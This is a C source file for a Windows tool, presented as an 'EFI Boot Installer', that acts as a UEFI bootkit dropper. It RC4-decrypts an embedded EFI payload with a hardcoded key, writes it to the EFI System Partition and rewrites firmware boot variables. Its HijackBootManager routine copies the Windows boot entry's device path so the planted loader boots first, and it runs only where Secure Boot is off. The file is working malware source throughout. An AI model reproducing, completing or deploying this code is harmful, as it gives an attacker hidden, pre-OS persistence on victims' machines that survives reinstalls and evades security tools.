#include "main.h"
#include "payload.h"

#define MAX_PATH 260

#define BOOT_DESCRIPTION           L"Custom EFI Loader"

#define EFI_DEST_RELATIVE_PATH     L"\\EFI\\CUSTOM\\loader.efi"
#define EFI_DEST_UEFI_PATH         L"\\EFI\\CUSTOM\\loader.efi"

#define TARGET_BOOT_INDEX          0x0009
#define TARGET_BOOT_VAR            L"Boot0009"

void Rc4Crypt(unsigned char* Data, long DataLen, unsigned char* Key, int KeyLen) {
    unsigned char S[256];
    int i, j = 0;
    unsigned char Temp;

    for (i = 0; i < 256; i++) {
        S[i] = i;
    }
    for (i = 0; i < 256; i++) {
        j = (j + S[i] + Key[i % KeyLen]) % 256;
        Temp = S[i];
        S[i] = S[j];
        S[j] = Temp;
    }

    i = 0;
    j = 0;
    for (long k = 0; k < DataLen; k++) {
        i = (i + 1) % 256;
        j = (j + S[i]) % 256;
        Temp = S[i];
        S[i] = S[j];
        S[j] = Temp;
        Data[k] ^= S[(S[i] + S[j]) % 256];
    }
}

static BOOL EnablePrivilege(LPCWSTR PrivName)
{
    HANDLE Token;
    if (!OpenProcessToken(GetCurrentProcess(),
        TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &Token))
        return FALSE;

    TOKEN_PRIVILEGES Tp = { 0 };
    Tp.PrivilegeCount = 1;
    if (!LookupPrivilegeValueW(NULL, PrivName, &Tp.Privileges[0].Luid)) {
        CloseHandle(Token);
        return FALSE;
    }
    Tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    BOOL Ok = AdjustTokenPrivileges(Token, FALSE, &Tp,
        sizeof(Tp), NULL, NULL);
    DWORD Err = GetLastError();
    CloseHandle(Token);
    return Ok && (Err == ERROR_SUCCESS);
}

BOOL CheckSecureBoot(void)
{
    DWORD  Size = sizeof(BYTE);
    BYTE   Value = 0;
    DWORD  Attrs = 0;
    BOOL   IsSecureBootEnabled = FALSE;

    DWORD Ret = GetFirmwareEnvironmentVariableExW(
        L"SecureBoot",
        L"{8be4df61-93ca-11d2-aa0d-00e098032b8c}",
        &Value, Size, &Attrs);

    printf("\n=== Secure Boot Status ===\n");

    if (Ret == 0) {
        DWORD Err = GetLastError();
        if (Err == ERROR_INVALID_FUNCTION) {
            printf("[!] System is NOT running in UEFI mode (Legacy BIOS).\n");
        }
        else {
            printf("[!] Could not query SecureBoot variable. Error: 0x%08lX\n", Err);
        }
        IsSecureBootEnabled = FALSE;
    }
    else {
        if (Value == 1) {
            printf("[+] Secure Boot: ENABLED\n");
            IsSecureBootEnabled = TRUE;
        }
        else {
            printf("[-] Secure Boot: DISABLED (value=%u)\n", (unsigned)Value);
            IsSecureBootEnabled = FALSE;
        }
    }
    printf("==========================\n\n");
    return IsSecureBootEnabled;
}

static BOOL GuidEqual(const GUID* A, const GUID* B)
{
    return memcmp(A, B, sizeof(GUID)) == 0;
}

static BOOL FindEspMountPoint(WCHAR* OutPath, DWORD OutSize)
{
    WCHAR VolName[MAX_PATH];
    HANDLE HFind = FindFirstVolumeW(VolName, MAX_PATH);
    if (HFind == INVALID_HANDLE_VALUE)
        return FALSE;

    do {
        WCHAR VolPath[MAX_PATH];
        wcscpy_s(VolPath, MAX_PATH, VolName);
        size_t Len = wcslen(VolPath);
        if (Len > 0 && VolPath[Len - 1] == L'\\')
            VolPath[Len - 1] = L'\0';

        HANDLE HVol = CreateFileW(VolPath,
            GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
            NULL, OPEN_EXISTING, 0, NULL);

        if (HVol == INVALID_HANDLE_VALUE)
            continue;

        DWORD OutBytes = 0;
        BYTE Buf[4096] = { 0 };
        DRIVE_LAYOUT_INFORMATION_EX* Layout = (DRIVE_LAYOUT_INFORMATION_EX*)Buf;

        VOLUME_DISK_EXTENTS Extents = { 0 };
        if (DeviceIoControl(HVol, IOCTL_VOLUME_GET_VOLUME_DISK_EXTENTS,
            NULL, 0, &Extents, sizeof(Extents), &OutBytes, NULL)
            && Extents.NumberOfDiskExtents > 0)
        {
            DWORD DiskNum = Extents.Extents[0].DiskNumber;
            LARGE_INTEGER Offset = Extents.Extents[0].StartingOffset;

            WCHAR DiskPath[64];
            swprintf_s(DiskPath, 64, L"\\\\.\\PhysicalDrive%lu", DiskNum);
            HANDLE HDisk = CreateFileW(DiskPath,
                GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE,
                NULL, OPEN_EXISTING, 0, NULL);

            if (HDisk != INVALID_HANDLE_VALUE) {
                if (DeviceIoControl(HDisk, IOCTL_DISK_GET_DRIVE_LAYOUT_EX,
                    NULL, 0, Buf, sizeof(Buf), &OutBytes, NULL)) {
                    for (DWORD i = 0; i < Layout->PartitionCount; i++) {
                        PARTITION_INFORMATION_EX* Pi = &Layout->PartitionEntry[i];
                        if (Pi->PartitionStyle == PARTITION_STYLE_GPT &&
                            GuidEqual(&Pi->Gpt.PartitionType, &EspPartitionTypeGuid) &&
                            Pi->StartingOffset.QuadPart == Offset.QuadPart)
                        {
                            CloseHandle(HDisk);
                            CloseHandle(HVol);

                            WCHAR MntBuf[MAX_PATH * 4] = { 0 };
                            DWORD MntLen = sizeof(MntBuf);
                            if (GetVolumePathNamesForVolumeNameW(VolName,
                                MntBuf, MAX_PATH * 4, &MntLen) && MntBuf[0])
                            {
                                wcscpy_s(OutPath, OutSize, MntBuf);
                                FindVolumeClose(HFind);
                                return TRUE;
                            }

                            wcscpy_s(OutPath, OutSize, VolName);
                            FindVolumeClose(HFind);
                            return TRUE;
                        }
                    }
                }
                CloseHandle(HDisk);
            }
        }
        CloseHandle(HVol);
    } while (FindNextVolumeW(HFind, VolName, MAX_PATH));

    FindVolumeClose(HFind);
    return FALSE;
}

static BYTE* BuildLoadOption(const WCHAR* EfiUefiPath,
    DWORD* OutSize,
    BYTE* HwPrefix,
    DWORD        HwPrefixSize)
{
    DWORD DescBytes = (DWORD)((wcslen(BOOT_DESCRIPTION) + 1) * sizeof(WCHAR));
    DWORD EfiPathBytes = (DWORD)((wcslen(EfiUefiPath) + 1) * sizeof(WCHAR));
    WORD  FileNodeLen = (WORD)(sizeof(EFI_DEVICE_PATH_PROTOCOL) + EfiPathBytes);
    WORD  EndNodeLen = sizeof(EFI_DEVICE_PATH_PROTOCOL);
    WORD  FilePathListLen = (WORD)(HwPrefixSize + FileNodeLen + EndNodeLen);

    DWORD TotalSize = sizeof(DWORD)
        + sizeof(WORD)
        + DescBytes
        + FilePathListLen;

    BYTE* Buf = (BYTE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, TotalSize);
    if (!Buf) return NULL;

    BYTE* P = Buf;

    DWORD Attrs = LOAD_OPTION_ACTIVE;
    memcpy(P, &Attrs, sizeof(DWORD)); P += sizeof(DWORD);

    memcpy(P, &FilePathListLen, sizeof(WORD)); P += sizeof(WORD);

    memcpy(P, BOOT_DESCRIPTION, DescBytes); P += DescBytes;

    memcpy(P, HwPrefix, HwPrefixSize); P += HwPrefixSize;

    EFI_DEVICE_PATH_PROTOCOL FpHdr;
    FpHdr.Type = MEDIA_DEVICE_PATH;
    FpHdr.SubType = MEDIA_FILEPATH_DP;
    FpHdr.Length[0] = (BYTE)(FileNodeLen & 0xFF);
    FpHdr.Length[1] = (BYTE)(FileNodeLen >> 8);
    memcpy(P, &FpHdr, sizeof(EFI_DEVICE_PATH_PROTOCOL));
    P += sizeof(EFI_DEVICE_PATH_PROTOCOL);
    memcpy(P, EfiUefiPath, EfiPathBytes);
    P += EfiPathBytes;

    EFI_DEVICE_PATH_PROTOCOL EndHdr;
    EndHdr.Type = END_DEVICE_PATH_TYPE;
    EndHdr.SubType = END_ENTIRE_DEVICE_PATH_SUBTYPE;
    EndHdr.Length[0] = (BYTE)(EndNodeLen & 0xFF);
    EndHdr.Length[1] = (BYTE)(EndNodeLen >> 8);
    memcpy(P, &EndHdr, sizeof(EFI_DEVICE_PATH_PROTOCOL));

    *OutSize = TotalSize;
    return Buf;
}

static BOOL HijackBootManager(void)
{
    WORD  BootOrderBuf[256] = { 0 };
    DWORD BoAttrs = 0;
    DWORD BoBytes = GetFirmwareEnvironmentVariableExW(
        L"BootOrder",
        L"{8be4df61-93ca-11d2-aa0d-00e098032b8c}",
        BootOrderBuf, sizeof(BootOrderBuf), &BoAttrs);

    if (BoBytes == 0) return FALSE;

    DWORD Count = BoBytes / sizeof(WORD);
    BYTE* WinEntry = NULL;
    DWORD WinEntrySize = 0;

    for (DWORD i = 0; i < Count; i++) {
        WCHAR VarName[16];
        swprintf_s(VarName, 16, L"Boot%04X", BootOrderBuf[i]);

        DWORD VarSize = 4096;
        BYTE* VarBuf = (BYTE*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, VarSize);
        if (!VarBuf) continue;

        DWORD R = GetFirmwareEnvironmentVariableExW(
            VarName,
            L"{8be4df61-93ca-11d2-aa0d-00e098032b8c}",
            VarBuf, VarSize, NULL);

        if (R == 0) { HeapFree(GetProcessHeap(), 0, VarBuf); continue; }

        WCHAR* Desc = (WCHAR*)(VarBuf + 6);
        if (wcsstr(Desc, L"Windows") || wcsstr(Desc, L"Boot Manager")) {
            WinEntry = VarBuf;
            WinEntrySize = R;
            printf("[+] Using entry Boot%04X as template.\n", BootOrderBuf[i]);
            break;
        }
        HeapFree(GetProcessHeap(), 0, VarBuf);
    }

    if (!WinEntry) {
        printf("[!] Windows boot entry not found.\n");
        return FALSE;
    }

    BYTE* P = WinEntry;

    WORD FilePathListLen;
    memcpy(&FilePathListLen, P + 4, sizeof(WORD));
    P += 6;

    WCHAR* DescPtr = (WCHAR*)P;
    while (*DescPtr) DescPtr++;
    DescPtr++;
    P = (BYTE*)DescPtr;

    BYTE* DpStart = P;
    BYTE* Cur = P;
    DWORD HwSize = 0;

    while (TRUE) {
        EFI_DEVICE_PATH_PROTOCOL* Node = (EFI_DEVICE_PATH_PROTOCOL*)Cur;
        WORD NodeLen = (WORD)(Node->Length[0] | (Node->Length[1] << 8));
        if (NodeLen < 4) break;
        if (Node->Type == END_DEVICE_PATH_TYPE) break;
        if (Node->Type == MEDIA_DEVICE_PATH && Node->SubType == MEDIA_FILEPATH_DP) break;
        HwSize += NodeLen;
        Cur += NodeLen;
    }

    if (HwSize == 0) {
        HeapFree(GetProcessHeap(), 0, WinEntry);
        printf("[!] Hardware prefix extraction failed.\n");
        return FALSE;
    }

    DWORD HwPrefixSize = HwSize;
    BYTE* HwPrefix = (BYTE*)HeapAlloc(GetProcessHeap(), 0, HwPrefixSize);
    memcpy(HwPrefix, DpStart, HwPrefixSize);

    HeapFree(GetProcessHeap(), 0, WinEntry);

    DWORD LoadOptSize = 0;
    BYTE* LoadOpt = BuildLoadOption(EFI_DEST_UEFI_PATH, &LoadOptSize, HwPrefix, HwPrefixSize);
    HeapFree(GetProcessHeap(), 0, HwPrefix);

    if (!LoadOpt) return FALSE;

    BOOL Ok = SetFirmwareEnvironmentVariableExW(
        TARGET_BOOT_VAR,
        L"{8be4df61-93ca-11d2-aa0d-00e098032b8c}",
        LoadOpt, LoadOptSize, TARGET_ATTRIBUTES);
    HeapFree(GetProcessHeap(), 0, LoadOpt);

    if (!Ok) {
        printf("[!] Boot entry write failed: 0x%08lX\n", GetLastError());
        return FALSE;
    }
    printf("[+] Boot%04X written.\n", TARGET_BOOT_INDEX);

    WORD BootNext = (WORD)TARGET_BOOT_INDEX;
    SetFirmwareEnvironmentVariableExW(
        L"BootNext",
        L"{8be4df61-93ca-11d2-aa0d-00e098032b8c}",
        &BootNext, sizeof(WORD), TARGET_ATTRIBUTES);
    printf("[+] BootNext set to Boot%04X.\n", TARGET_BOOT_INDEX);

    WORD NewOrder[257] = { 0 };
    NewOrder[0] = TARGET_BOOT_INDEX;
    DWORD Pos = 1;
    for (DWORD i = 0; i < Count; i++) {
        if (BootOrderBuf[i] == TARGET_BOOT_INDEX) continue;
        NewOrder[Pos++] = BootOrderBuf[i];
    }

    SetFirmwareEnvironmentVariableExW(
        L"BootOrder",
        L"{8be4df61-93ca-11d2-aa0d-00e098032b8c}",
        NewOrder, Pos * sizeof(WORD),
        TARGET_ATTRIBUTES);

    printf("[+] BootOrder updated.\n");
    return TRUE;
}

BOOL WriteEfiPayloadToEsp(LPCWSTR EspPath, unsigned char* PPayload, DWORD PayloadSize)
{
    /* ---- Payload sanity check ---- */
    if (PPayload == NULL || PayloadSize == 0) {
        printf("[-] ERROR: Payload is empty or NULL! (size=%lu)\n", PayloadSize);
        return FALSE;
    }

    /* PE/EFI header sanity check: Must have MZ signature */
    if (PayloadSize < 64 || PPayload[0] != 'M' || PPayload[1] != 'Z') {
        printf("[-] WARNING: Payload does not start with PE/MZ header (0x%02X 0x%02X). Not an EFI binary!\n",
            PPayload[0], PPayload[1]);
        /* Continue anyway but warn */
    }

    printf("[*] Payload size: %lu byte\n", PayloadSize);

    /* ---- 1. Create full target path ---- */
    WCHAR DestPath[MAX_PATH] = { 0 };
    LPCWSTR RelPath = EFI_DEST_RELATIVE_PATH;

    /* Does ESP path end with '\'? Remove double slash */
    size_t EspLen = wcslen(EspPath);
    if (EspLen > 0 && EspPath[EspLen - 1] == L'\\' && RelPath[0] == L'\\') {
        RelPath++;
    }
    swprintf_s(DestPath, MAX_PATH, L"%s%s", EspPath, RelPath);
    printf("[*] Target path: %ls\n", DestPath);

    /* ---- 2. Create missing directories (recursive) ---- */
    WCHAR BuildPath[MAX_PATH] = { 0 };
    wcscpy_s(BuildPath, MAX_PATH, EspPath);
    if (BuildPath[wcslen(BuildPath) - 1] != L'\\') {
        wcscat_s(BuildPath, MAX_PATH, L"\\");
    }

    WCHAR RelCopy[MAX_PATH] = { 0 };
    wcscpy_s(RelCopy, MAX_PATH, EFI_DEST_RELATIVE_PATH);

    /* Skip leading '\' character */
    LPCWSTR RelStart = RelCopy;
    if (RelStart[0] == L'\\') RelStart++;

    WCHAR RelCopy2[MAX_PATH] = { 0 };
    wcscpy_s(RelCopy2, MAX_PATH, RelStart);

    WCHAR* Context = NULL;
    WCHAR* Token = wcstok_s(RelCopy2, L"\\", &Context);

    while (Token != NULL) {
        WCHAR* NextToken = wcstok_s(NULL, L"\\", &Context);
        if (NextToken == NULL) {
            break; /* Last token = filename */
        }
        wcscat_s(BuildPath, MAX_PATH, Token);
        wcscat_s(BuildPath, MAX_PATH, L"\\");

        BOOL DirOk = CreateDirectoryW(BuildPath, NULL);
        DWORD DirErr = GetLastError();
        if (!DirOk && DirErr != ERROR_ALREADY_EXISTS) {
            printf("[-] Failed to create directory: %ls (Error: %lu)\n", BuildPath, DirErr);
            return FALSE;
        }
        if (DirOk) {
            printf("[+] Directory created: %ls\n", BuildPath);
        }
        Token = NextToken;
    }

    /* ---- 3. Delete old file (if exists) - also remove read-only attribute ---- */
    DWORD ExistingAttrs = GetFileAttributesW(DestPath);
    if (ExistingAttrs != INVALID_FILE_ATTRIBUTES) {
        if (ExistingAttrs & FILE_ATTRIBUTE_READONLY) {
            SetFileAttributesW(DestPath, ExistingAttrs & ~FILE_ATTRIBUTE_READONLY);
        }
        DeleteFileW(DestPath);
        printf("[*] Old file deleted.\n");
    }

    /* ---- 4. Create file (with FILE_FLAG_WRITE_THROUGH to skip cache!) ---- */
    HANDLE HFile = CreateFileW(
        DestPath,
        GENERIC_WRITE,
        FILE_SHARE_READ,                          /* Prevent antivirus lock */
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL | FILE_FLAG_WRITE_THROUGH,  /* BYPASS CACHE! */
        NULL);

    if (HFile == INVALID_HANDLE_VALUE) {
        DWORD Err = GetLastError();
        printf("[-] Failed to create file. Error Code: %lu\n", Err);
        if (Err == 5) {
            printf("    -> Access denied. Run as Administrator!\n");
        }
        else if (Err == 3) {
            printf("    -> Path not found. ESP may not be mounted.\n");
        }
        else if (Err == 32) {
            printf("    -> File is being used by another process.\n");
        }
        return FALSE;
    }

    /* ---- 5. Write data in chunks (for large files) ---- */
    DWORD TotalWritten = 0;
    const DWORD ChunkSize = 65536; /* 64KB */

    while (TotalWritten < PayloadSize) {
        DWORD Remaining = PayloadSize - TotalWritten;
        DWORD ToWrite = (Remaining < ChunkSize) ? Remaining : ChunkSize;
        DWORD Written = 0;

        BOOL WriteOk = WriteFile(
            HFile,
            PPayload + TotalWritten,
            ToWrite,
            &Written,
            NULL);

        if (!WriteOk || Written != ToWrite) {
            DWORD Err = GetLastError();
            printf("[-] WriteFile failed! Written: %lu/%lu, Error: %lu\n",
                Written, ToWrite, Err);
            CloseHandle(HFile);
            DeleteFileW(DestPath); /* Delete corrupted file */
            return FALSE;
        }
        TotalWritten += Written;
    }

    /* ---- 6. CRITICAL: Flush to disk (cache bypass is not enough) ---- */
    if (!FlushFileBuffers(HFile)) {
        printf("[-] FlushFileBuffers failed! Error: %lu\n", GetLastError());
        CloseHandle(HFile);
        return FALSE;
    }

    /* ---- 7. Verify written size ---- */
    LARGE_INTEGER FileSize = { 0 };
    if (!GetFileSizeEx(HFile, &FileSize)) {
        printf("[-] GetFileSizeEx failed!\n");
        CloseHandle(HFile);
        return FALSE;
    }

    CloseHandle(HFile);

    if (FileSize.QuadPart != (LONGLONG)PayloadSize) {
        printf("[-] ERROR: File size mismatch! Expected: %lu, Actual: %lld\n",
            PayloadSize, FileSize.QuadPart);
        return FALSE;
    }

    printf("[+] %lu byte successfully written and flushed to disk.\n", TotalWritten);

    /* ---- 8. EXTRA: Flush at volume level (for ESP cache) ---- */
    /* Open ESP volume handle and call FlushFileBuffers */
    WCHAR VolPath[8] = { 0 };
    swprintf_s(VolPath, 8, L"\\\\.\\%c:", EspPath[0]);

    HANDLE HVol = CreateFileW(
        VolPath,
        GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,
        0,
        NULL);

    if (HVol != INVALID_HANDLE_VALUE) {
        FlushFileBuffers(HVol);
        CloseHandle(HVol);
        printf("[+] Volume-level flush completed.\n");
    }

    return TRUE;
}

int wmain()
{
    printf("============================================================\n");
    printf("  EFI Boot Installer  -  Windows User-Mode Tool\n");
    printf("============================================================\n\n");

    /* ---- Step 0: Enable required privilege ---- */
    printf("[*] Enabling SeSystemEnvironmentPrivilege...\n");
    if (!EnablePrivilege(L"SeSystemEnvironmentPrivilege")) {
        printf("[!] Failed to enable SeSystemEnvironmentPrivilege.\n");
        printf("    Please run this program as Administrator.\n");
        return 1;
    }
    printf("[+] Privilege enabled.\n\n");

    /* ---- Step 1: Secure Boot check ---- */
    BOOLEAN SecureBootStatus = CheckSecureBoot();
    if (1 == SecureBootStatus) {
        printf("Secure Boot is enabled!\n");
        return -1;
    }
    printf("Secure boot is disabled!\n");

    unsigned char Key[] = "@uASdHBA&%*7ygLYXfWh%*xJWD3GR_yBSxK!";
    int KeyLen = strlen((char*)Key);
    printf("[*] Decrypting payload...\n");
    Rc4Crypt(EfiPayload, EfiPayloadSize, Key, KeyLen);

    /* ---- Step 2: Find ESP ---- */
    printf("[*] Locating EFI System Partition...\n");
    WCHAR EspPath[MAX_PATH] = { 0 };
    if (!FindEspMountPoint(EspPath, MAX_PATH)) {
        printf("[!] Could not find or mount the EFI System Partition.\n");
        return 1;
    }
    printf("[+] ESP found at: %ls\n\n", EspPath);

    /* ---- Step 3: Write embedded EFI bytes to ESP ---- */
    printf("[*] Installing embedded EFI payload to ESP...\n");

    if (!WriteEfiPayloadToEsp(EspPath, EfiPayload, EfiPayloadSize)) {
        printf("[!] Failed to install EFI payload.\n");
        return 1;
    }
    printf("[+] Embedded payload successfully written to ESP.\n\n");

    /* ---- Step 4: Create boot entry & update BootOrder ---- */
    printf("[*] Configuring UEFI boot entry...\n");
    if (!HijackBootManager()) {
        printf("[!] Boot manager configuration failed.\n");
        return 1;
    }

    printf("\n============================================================\n");
    printf("[+] Done! Reboot the system to activate the new boot entry.\n");
    printf("    New BootOrder[0] = Boot%04X (%ls)\n",
        TARGET_BOOT_INDEX, BOOT_DESCRIPTION);
    printf("    EFI installed at ESP:%ls\n", EFI_DEST_RELATIVE_PATH);
    printf("============================================================\n");

    return 0;
}